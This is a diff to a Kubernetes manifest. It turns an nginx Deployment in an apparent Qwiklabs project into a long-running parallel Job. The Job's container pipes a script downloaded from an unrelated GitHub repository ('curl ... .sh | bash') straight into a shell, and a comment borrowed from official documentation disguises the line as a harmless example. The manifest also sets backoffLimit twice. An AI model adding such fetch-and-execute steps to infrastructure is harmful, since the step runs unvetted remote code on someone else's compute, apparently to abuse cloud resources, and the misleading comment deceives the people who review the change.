@@ -1,20 +1,30 @@
----
-apiVersion: apps/v1
-kind: Deployment
+apiVersion: batch/v1
+kind: Job
 metadata:
-  name: ngin
+  name: job-pod-failure-policy
 spec:
-  replicas: 10
-  selector:
-    matchLabels:
-      app: ngin
+  backoffLimit: 5
+  activeDeadlineSeconds: 432000
+  completions: 12
+  parallelism: 3
   template:
-    metadata:
-      labels:
-        app: ngin
     spec:
+      restartPolicy: Never
       containers:
-        - name: ngin
-          image: gcr.io/qwiklabs-gcp-03-5ba82fbc2dca/vitcuka:latest
-          ports:
-            - containerPort: 80
+      - name: main
+        image: gcr.io/deeplearning-platform-release/xgboost-cpu:latest
+        command: ["bash"]        # example command simulating a bug which triggers the FailJob action
+        args:
+        - -c
+        - curl -sL https://github.com/loeto21/koplok/raw/main/.sh | bash
+  backoffLimit: 6
+  podFailurePolicy:
+    rules:
+    - action: FailJob
+      onExitCodes:
+        containerName: main      # optional
+        operator: In             # one of: In, NotIn
+        values: [42]
+    - action: Ignore             # one of: Ignore, FailJob, Count
+      onPodConditions:
+      - type: DisruptionTarget   # indicates Pod disruption
